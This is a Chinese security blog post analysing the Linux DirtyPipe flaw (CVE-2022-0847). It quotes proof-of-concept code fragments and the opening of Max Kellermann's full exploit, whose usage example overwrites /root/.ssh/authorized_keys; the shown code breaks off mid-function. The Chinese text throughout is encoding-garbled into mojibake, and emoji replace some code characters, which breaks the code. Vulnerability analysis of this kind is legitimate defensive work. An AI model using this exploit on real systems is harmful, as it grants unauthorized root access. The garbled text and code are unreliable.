---
title: DirtyPipeï¼ˆCVE-2022-0847ï¼‰æ¼æ´åˆ†æ
url: https://www.secpulse.com/archives/194277.html
source: å®‰å…¨è„‰æ
date: 2022-12-30
fetch_date: 2025-10-04T02:43:53.594861
---

# DirtyPipeï¼ˆCVE-2022-0847ï¼‰æ¼æ´åˆ†æ

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "å®‰å…¨è„‰æ")

* [é¦–é¡µ](https://www.secpulse.com/)
* [åˆ†ç±»é˜…è¯»](https://www.secpulse.com/archives/category/category)

  #### è„‰ææ–‡åº“

  - [å†…ç½‘æ¸—é€](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [ä»£ç å®¡è®¡](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [å®‰å…¨æ–‡çŒ®](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Webå®‰å…¨](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [ç§»åŠ¨å®‰å…¨](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [ç³»ç»Ÿå®‰å…¨](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [å·¥æ§å®‰å…¨](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOTå®‰å…¨](https://www.secpulse.com/archives/category/iot-security)
  - |

#### å®‰å…¨å»ºè®¾

+ [ä¸šåŠ¡å®‰å…¨](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [å®‰å…¨ç®¡ç†](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [æ•°æ®åˆ†æ](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### å…¶ä»–

+ [èµ„è®¯](https://www.secpulse.com/archives/category/news)
+ |
+ [æ¼æ´](https://www.secpulse.com/archives/category/vul)
+ |
+ [å·¥å…·](https://www.secpulse.com/archives/category/tools)
+ |
+ [äººç‰©å¿—](https://www.secpulse.com/archives/category/people)
+ |
+ [åŒºå—é“¾å®‰å…¨](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [å®‰å…¨æ‹›è˜](https://www.secpulse.com/archives/category/hiring)
+ |

- [å®‰å…¨é—®ç­”](https://www.secpulse.com/newpage/question_list)
- [é‡‘å¸å•†åŸ](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [å®‰å…¨æ‹›è˜](https://www.secpulse.com/archives/category/hiring)
- [æ´»åŠ¨æ—¥ç¨‹](https://www.secpulse.com/newpage/activity)
- [liveè¯¾ç¨‹](https://www.secpulse.com/live)
- [ä¼ä¸šæœåŠ¡](https://duoyinsu.com/service.html)
- [æ’ä»¶ç¤¾åŒº](https://x.secpulse.com/)

å°ç¨‹åº

![è„‰æå°ç¨‹åº](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[ç™»å½•](https://www.secpulse.com/user_login)
|
[æ³¨å†Œ](https://www.secpulse.com/user-register)

# DirtyPipeï¼ˆCVE-2022-0847ï¼‰æ¼æ´åˆ†æ

[æ¼æ´](https://www.secpulse.com/archives/category/vul)

[èšæ™¯ç½‘å®‰å®éªŒå®¤](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2022-12-29

11,197

# å‰è¨€

`CVE-2022-0847 Â DirtyPipe`è„ç®¡é“æ¼æ´æ˜¯`Linux`å†…æ ¸ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸å†™åªè¯»æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´ææƒã€‚

# è°ƒè¯•ç¯å¢ƒ

* â€¢Â `ubuntu 20.04`
* â€¢Â `Linux-5.16.10`
* â€¢Â `qemu-system-x86_64 4.2.1`

# æ¼æ´éªŒè¯

é¦–å…ˆåˆ›å»ºä¸€ä¸ªåªè¯»æ–‡ä»¶`foo.txt`ï¼Œå¹¶ä¸”æ­£å¸¸æƒ…å†µä¸‹æ˜¯æ— æ³•ä¿®æ”¹è¯¥å¯è¯»æ–‡ä»¶ï¼Œä½†æ˜¯åˆ©ç”¨äº†`DirtyPipe`æ¼æ´åå‘ç°å¯ä»¥å°†å­—ç¬¦`aaaa`å†™å…¥åˆ°åªè¯»æ–‡ä»¶ä¸­

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284958.png)

# æ¼æ´åˆ†æ

ä»¥`poc`ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œåˆ†ææ¼æ´æˆå› 

é¦–å…ˆ`poc`åˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œç®¡é“ç¼“å†²åŒºçš„é»˜è®¤å¤§å°ä¸º4096ï¼Œå¹¶ä¸”æ‹¥æœ‰16ä¸ªç¼“å­˜åŒºï¼Œå› æ­¤å†åˆ›å»ºç®¡é“ä¹‹åï¼Œ`poc`é¦–å…ˆè¦åšçš„æ˜¯å°†è¿™16ä¸ªç®¡é“ç¼“å†²åŒºå¡«æ»¡ã€‚

```
...
Â Â Â Â ifÂ (pipe(p))Â abort();

Â Â Â Â constÂ unsignedÂ pipe_sizeÂ =Â fcntl(p[1],Â F_GETPIPE_SZ);
Â Â Â Â staticÂ charÂ buffer[4096];

Â Â Â Â forÂ (unsignedÂ rÂ =Â pipe_size;Â rÂ >Â 0ğŸ˜‰Â {
Â Â Â Â Â Â Â Â unsignedÂ nÂ =Â rÂ >Â sizeof(buffer)Â ?Â sizeof(buffer)Â :Â r;
Â Â Â Â Â Â Â Â write(p[1],Â buffer,Â n);
Â Â Â Â Â Â Â Â rÂ -=Â n;
Â Â Â Â }
...
```

åœ¨è¿›è¡Œç®¡é“å†™çš„æ“ä½œæ—¶ï¼Œå†…æ ¸æ˜¯é‡‡ç”¨`pipe_write`å‡½æ•°è¿›è¡Œæ“ä½œï¼Œè¿™é‡Œæˆªå–äº†å…³é”®éƒ¨åˆ†ï¼Œåœ¨è¿›è¡Œç®¡é“å†™çš„æ—¶å€™ä¼šåˆ¤æ–­é€šè¿‡å‡½æ•°`is_packetized`å»åˆ¤æ–­æ˜¯å¦ä¸ºç›®å½•å±æ€§ï¼Œå¦‚æœä¸æ˜¯åˆ™å°†ç¼“å†²åŒºçš„æ ‡å¿—ä½è®¾ç½®ä¸º`PIPE_BUF_FLAG_CAN_MERGE`ï¼Œè¿™ä¸ªæ ‡å¿—ä½éå¸¸å…³é”®ï¼Œæ˜¯å¯¼è‡´æ¼æ´æˆå› ï¼Œå› æ­¤`poc`ä¸ºäº†ä½¿16ä¸ªç®¡é“ç¼“å†²åŒºéƒ½è®¾ç½®`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ä½ï¼Œå› æ­¤é€‰æ‹©å¾ªç¯16æ¬¡ï¼Œ å¹¶ä¸”å°†æ¯ä¸ªç®¡é“ç¼“å†²åŒºéƒ½å†™æ»¡ã€‚

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284959.png)

éšç€`poc`å°†ç®¡é“å†…çš„æ•°æ®å…¨éƒ¨è¯»å‡ºï¼Œä¸ºäº†æ¸…ç©ºç®¡é“ç¼“å†²åŒºï¼Œåœ¨è¿›è¡Œç®¡é“è¯»çš„è¿‡ç¨‹ä¸­ï¼Œå†…æ ¸é‡‡ç”¨çš„æ˜¯`pipe_read`å‡½æ•°ï¼Œåœ¨æ•´ä¸ªç®¡é“è¯»çš„è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šä¿®æ”¹ç®¡é“çš„æ ‡å¿—ä½çš„ï¼Œå› æ­¤`PIPE_BUF_FLAG_CAN_MEGE`æ ‡å¿—ä½ä¾æ—§å­˜åœ¨

```
...
forÂ (unsignedÂ rÂ =Â pipe_size;Â rÂ >Â 0ğŸ˜‰Â {
Â Â Â Â Â Â Â Â unsignedÂ nÂ =Â rÂ >Â sizeof(buffer)Â ?Â sizeof(buffer)Â :Â r;
Â Â Â Â Â Â Â Â read(p[0],Â buffer,Â n);
Â Â Â Â Â Â Â Â rÂ -=Â n;
Â Â Â Â }
...
```

ç´§æ¥ç€æ˜¯è§¦å‘æ¼æ´çš„å…³é”®å‡½æ•°ï¼Œ`splice`å‡½æ•°ï¼Œç”¨äºç§»åŠ¨æ•°æ®ï¼Œæ­¤æ—¶`fd`æŒ‡å‘æˆ‘ä»¬æƒ³è¯»å–çš„æ–‡ä»¶ï¼Œå¯¹åº”ä¸Šè¿°çš„`foo.txt`åªè¯»æ–‡ä»¶ï¼Œp[1]æŒ‡å‘çš„æ˜¯æˆ‘ä»¬çš„ç®¡é“ç¬¦ã€‚

```
...
ssize_tÂ nbytesÂ =Â splice(fd,Â &offset,Â p[1],Â NULL,Â 1,Â 0);
...
```

åœ¨è°ƒç”¨`splice`å‡½æ•°æ—¶ï¼Œå†…æ ¸åœ¨æŸä¸ªé˜¶æ®µä¼šè°ƒç”¨`copy_page_to_iter`å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å½“ç®¡é“æ»¡äº†ä¹‹åå°±æ²¡åŠæ³•é€šè¿‡`splice`å‡½æ•°å¾€ç®¡é“å†…ç»§ç»­è¾“å…¥æ•°æ®ï¼Œé‚£ä¹ˆ`splice`å‡½æ•°å°±æ— æ³•æ­£å¸¸æ‰§è¡Œäº†ï¼Œå› æ­¤éœ€è¦æ¸…ç©ºç®¡é“å†…çš„æ•°æ®ã€‚

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284960.png)

åé¢åˆ™åˆ°è¾¾äº†æ¼æ´å‘ç”Ÿçš„ä»£ç ï¼Œç”±äºæˆ‘ä»¬ä½¿ç”¨`splice`å‡½æ•°è¿›è¡Œæ•°æ®çš„ç§»åŠ¨ï¼Œåœ¨å†…æ ¸ä¸­ä¸æ˜¯é€‰æ‹©å°†æ•°æ®ç›´æ¥ä»æ–‡ä»¶ä¸­æ‹·è´åˆ°ç®¡é“ä¸­ï¼Œè€Œæ˜¯å°†æ–‡ä»¶æ‰€åœ¨çš„ç‰©ç†é¡µç›´æ¥èµ‹å€¼ç»™ç®¡é“ç¼“å†²åŒºæ‰€å¯¹åº”çš„é¡µé¢ã€‚

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284962.png)

è¿™é‡Œè®°å½•ä¸€ä¸‹ç‰©ç†é¡µçš„åœ°å€

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284963.png)

æœ€åå°±æ˜¯å†æ¬¡è°ƒç”¨ç®¡é“å†™çš„æ“ä½œï¼Œä½†æ˜¯è¿™é‡Œå®é™…ä¼šå†™å…¥åªè¯»æ–‡ä»¶å†…éƒ¨

```
...
nbytesÂ =Â write(p[1],Â data,Â data_size);
...
```

ç”±äºå·²ç»é€šè¿‡`splice`å‡½æ•°ç§»åŠ¨æ•°æ®åˆ°ç®¡é“ç¼“å†²åŒºå¤å†…éƒ¨äº†ï¼Œå› æ­¤ç®¡é“ä¸ä¸ºç©ºä¼šè¿›å…¥åˆ°`455`è¡Œçš„å†…éƒ¨å¤„ç†é€»è¾‘

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284964.png)

æœ€ç»ˆåˆ°è¾¾äº†å¾€åªè¯»æ–‡ä»¶å†™å…¥çš„æ“ä½œï¼Œè¿™é‡Œçœ‹åˆ°äº†`PIPE_BUF_FLAG_CAN_MERGE`è¿™ä¸ªæ ‡å¿—ä½çš„ä½œç”¨ï¼Œè¯¥æ ‡å¿—ä½å°±æ˜¯ä¼šå°†æ•°æ®åˆå¹¶ï¼Œä½¿å¾—åç»­ç®¡é“å†™çš„æ“ä½œä¼šç»§ç»­å‘ä¹‹å‰çš„ç®¡é“ç¼“å†²åŒºå¯¹åº”çš„ç‰©ç†é¡µé¢ç»§ç»­å†™å…¥ï¼Œå†™å…¥çš„æ“ä½œæ˜¯é€šè¿‡`copy_page_from_iter(buf->page,offset,chars,from)`å‡½æ•°è¿›è¡Œå®Œæˆçš„ï¼Œè¯¥å‡½æ•°å®é™…å°±æ˜¯å°†`from`å¯¹åº”çš„æ•°æ®å†™å…¥åˆ°`buf->page`ä¸­

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284966.png)

å¯ä»¥çœ‹åˆ°`buf->page`ä¸`page`åœ°å€æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬å°†æ•°æ®å†™å…¥ä¿®æ”¹åˆ°`foo.txt`æ–‡ä»¶ä¸­

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284968.png)

# è¡¥ä¸

è¡¥ä¸é¡µæ¯”è¾ƒç®€å•ï¼Œåœ¨è·å–ç‰©ç†é¡µçš„åŒæ—¶æŠŠç®¡é“ç¼“å†²åŒºçš„æ ‡å¿—ä½æ¸…ç©ºï¼Œå°±ä¸ä¼šå¯¼è‡´åé¢å¯¹ç®¡é“è¿›è¡Œå†™æ“ä½œçš„æ—¶å€™è¿›å…¥åˆå¹¶æ•°æ®æµçš„æµç¨‹

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-16722849681.png "null")

image-20221227164411448

# æ€»ç»“

`DirtyPipe`**æ”»å‡»æµç¨‹**

* â€¢Â å°†æ‰€æœ‰ç®¡é“ç¼“å†²åŒºéƒ½è®¾ç½®`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ä½
* â€¢Â æ¸…ç©ºç®¡é“ç¼“å†²åŒº
* â€¢Â ä½¿ç”¨`splice`å‡½æ•°è·å–æ–‡ä»¶æ‰€å¯¹åº”çš„ç‰©ç†é¡µ
* â€¢Â ä½¿ç”¨`pipe_write`å‡½æ•°å¯¹æ‹¥æœ‰`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ä½çš„å¤„ç†ï¼Œå¯¹è·å¾—æ–‡ä»¶å¯¹åº”çš„ç‰©ç†é¡µè¿›è¡Œå†™å…¥æ“ä½œï¼Œä»è€Œè¾¾åˆ°å¯¹åªè¯»æ–‡ä»¶å†™å…¥çš„æ“ä½œ

`DirtyPipe`**åˆ©ç”¨çš„é™åˆ¶**

* â€¢Â å¯¹æ–‡ä»¶æœ‰è¯»æƒé™ï¼Œå› ä¸º`splice`å‡½æ•°ä¼šé¦–å…ˆåˆ¤æ–­å¯¹æ–‡ä»¶æ˜¯å¦æœ‰å¯è¯»æƒé™ï¼Œè‹¥æ— åˆ™æ— æ³•æ­£å¸¸æ‰§è¡Œ
* â€¢Â ç”±äº`DirtyPipe`æ˜¯å¯¹æ–‡ä»¶å¯¹åº”çš„ç‰©ç†åšè¦†å†™æ“ä½œï¼Œå› æ­¤ä¸èƒ½ä¿®æ”¹è¶…è¿‡æ–‡ä»¶æœ¬èº«å¤§å°çš„æ•°æ®ï¼Œä»¥åŠæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ— æ³•è¢«ä¿®æ”¹ï¼ˆå› ä¸º`splice`å‡½æ•°éœ€è¦ç§»åŠ¨è‡³å°‘ä¸€å­—èŠ‚æ•°æ®ï¼‰
* â€¢Â ç”±äº`DirtyPipe`æ˜¯å¯¹ç‰©ç†é¡µè¿›è¡Œä¿®æ”¹ï¼Œå› æ­¤ä¿®æ”¹æ•°æ®å¤§å°ä¹Ÿä¸èƒ½è¶…è¿‡ä¸€é¡µ

# å®Œæ•´çš„poc

```
/*Â SPDX-License-Identifier:Â GPL-2.0Â */
/*
Â *Â CopyrightÂ 2022Â CM4allÂ GmbHÂ /Â IONOSÂ SE
Â *
Â *Â author:Â MaxÂ KellermannÂ <max.kellermann@ionos.com>
Â *
Â *Â Proof-of-conceptÂ exploitÂ forÂ theÂ DirtyÂ Pipe
Â *Â vulnerabilityÂ (CVE-2022-0847)Â causedÂ byÂ anÂ uninitialized
Â *Â "pipe_buffer.flags"Â variable.Â Â ItÂ demonstratesÂ howÂ toÂ overwriteÂ any
Â *Â fileÂ contentsÂ inÂ theÂ pageÂ cache,Â evenÂ ifÂ theÂ fileÂ isÂ notÂ permitted
Â *Â toÂ beÂ written,Â immutableÂ orÂ onÂ aÂ read-onlyÂ mount.
Â *
Â *Â ThisÂ exploitÂ requiresÂ LinuxÂ 5.8Â orÂ later;Â theÂ codeÂ pathÂ wasÂ made
Â *Â reachableÂ byÂ commitÂ f6dd975583bdÂ ("pipe:Â merge
Â *Â anon_pipe_buf*_ops").Â Â TheÂ commitÂ didÂ notÂ introduceÂ theÂ bug,Â itÂ was
Â *Â thereÂ before,Â itÂ justÂ providedÂ anÂ easyÂ wayÂ toÂ exploitÂ it.
Â *
Â *Â ThereÂ areÂ twoÂ majorÂ limitationsÂ ofÂ thisÂ exploit:Â theÂ offsetÂ cannot
Â *Â beÂ onÂ aÂ pageÂ boundaryÂ (itÂ needsÂ toÂ writeÂ oneÂ byteÂ beforeÂ theÂ offset
Â *Â toÂ addÂ aÂ referenceÂ toÂ thisÂ pageÂ toÂ theÂ pipe),Â andÂ theÂ writeÂ cannot
Â *Â crossÂ aÂ pageÂ boundary.
Â *
Â *Â Example:Â ./write_anythingÂ /root/.ssh/authorized_keysÂ 1Â $'nssh-ed25519Â AAA......n'
Â *
Â *Â FurtherÂ explanation:Â https://dirtypipe.cm4all.com/
Â */

#defineÂ _GNU_SOURCE
#includeÂ <unistd.h>
#includeÂ <fcntl.h>
#includeÂ <stdio.h>
#includeÂ <stdlib.h>
#includeÂ <string.h>
#includeÂ <sys/stat.h>
#includeÂ <sys/user.h>

#ifndefÂ PAGE_SIZE
#defineÂ PAGE_SIZEÂ 4096
#endif

/**
Â *Â CreateÂ aÂ pipeÂ whereÂ allÂ "bufs"Â onÂ theÂ pipe_inode_infoÂ ringÂ haveÂ the
Â *Â PIPE_BUF_FLAG_CAN_MERGEÂ flagÂ set.
Â */
staticÂ voidÂ prepare_pipe(intÂ p[2])
{
Â Â Â Â ifÂ (pipe(p))Â abort();

Â Â Â Â constÂ unsignedÂ pipe_sizeÂ =Â fcntl(p[1],Â F_GETPIPE_SZ);
Â Â Â Â staticÂ charÂ buffer[4096];

Â Â Â Â /*Â fillÂ theÂ pipeÂ completely;Â eachÂ pipe_bufferÂ willÂ nowÂ have
Â Â Â Â Â Â Â theÂ PIPE_BUF_FLAG_CAN_MERGEÂ flagÂ */
Â Â Â Â forÂ (unsignedÂ rÂ =Â pipe_size;Â rÂ >Â 0ğŸ˜‰Â {
Â Â Â Â Â Â Â Â unsignedÂ nÂ =Â rÂ >Â sizeof(buffer)Â ?Â sizeof(buffer)Â :Â r;
Â Â Â Â Â Â Â Â write(p[1],Â buffer,Â n);
Â Â Â Â Â Â Â Â rÂ -=Â n;
Â Â Â Â }

Â Â Â Â /*Â drainÂ theÂ pipe,Â freeingÂ allÂ pipe_bufferÂ instancesÂ (but
Â Â Â Â Â Â Â leavingÂ theÂ flagsÂ initialized)Â */
Â Â Â Â forÂ (unsignedÂ rÂ =Â pipe_size;Â rÂ >Â 0ğŸ˜‰Â {
Â Â Â Â Â Â Â Â unsignedÂ nÂ =Â rÂ >Â sizeof(buffer)Â ?Â sizeof(buf...